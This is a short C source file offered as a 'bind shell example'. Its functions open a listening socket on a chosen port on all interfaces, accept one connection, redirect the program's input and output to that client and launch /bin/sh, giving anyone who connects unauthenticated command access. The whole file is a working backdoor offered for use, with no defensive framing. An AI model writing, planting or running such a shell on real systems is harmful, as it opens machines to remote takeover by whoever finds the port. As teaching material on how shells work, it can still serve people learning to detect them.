/* Bind shell example in C. */

#include <stdio.h>         // std library
#include <stdlib.h>        // std library
#include <unistd.h>        // dup2(), execl()
#include <netinet/in.h>    // sockaddr_in, INADDR_ANY
#include <sys/socket.h>    // socket(), bind(), listen(), accept()
#include <arpa/inet.h>     // htons()

#pragma once // include once

typedef struct BINDSHELL {
    int sockfd, clientfd; // socket file descriptor, clien file descriptor. 
    struct sockaddr_in addr; // socket.
    unsigned short port;
} BINDSHELL;

BINDSHELL* create_shell(unsigned short port) {
    BINDSHELL* shell = (BINDSHELL*)malloc(sizeof(BINDSHELL));
    
    // default protocol, IPv4, reliable data stream.    
    if((shell->sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
        fprintf(stderr, "Can't open socket, cleaning memory.\n");
        free(shell);
        return NULL;
    }
    
    shell->addr.sin_family = AF_INET; // IPv4
    shell->addr.sin_addr.s_addr = INADDR_ANY; // not binding to a specific ip.
    shell->addr.sin_port = htons(port); // giving the port with network byte-order.
    
    // binds to the given port.
    if((bind(shell->sockfd, (struct sockaddr*)(&shell->addr), sizeof(shell->addr))) < 0) {
        fprintf(stderr, "Can't bind, cleaning memory.\n");
        free(shell);
        return NULL;
    }

    return shell;
}

void kill_shell(BINDSHELL *shell) {
    // close the socket
    if(shell->sockfd) {close(shell->sockfd);}
    if(shell->clientfd) {close(shell->clientfd);}
    
    // just frees the memory.
    free(shell);
}

unsigned char start_shell(BINDSHELL *shell) {
    if(shell == NULL) {
        fprintf(stderr, "Please give valid parameter shell is NULL.\n");
        return 0;
    }
    
    // activates the shell and starts to listen for connections.
    if((listen(shell->sockfd, 0)) < 0) {
        fprintf(stderr, "Can't listen for incoming connections.\n");
        return 0;      
    }
    
    // this for addr_len parameter for accept()
    socklen_t len = sizeof(shell->addr);

    // accepts the incoming connection.
    if((shell->clientfd = accept(shell->sockfd, (struct sockaddr*)(&shell->addr), &len)) < 0) {
        fprintf(stderr, "Can't accept incoming connections.\n");
        return 0;          
    }
    
    // makes it able read stdin, stdout, stderr.
    dup2(shell->clientfd, 0);
    dup2(shell->clientfd, 1);
    dup2(shell->clientfd, 2);

    // starts bash terminal.
    execl("/bin/sh", "sh", NULL);

    return 1;
}
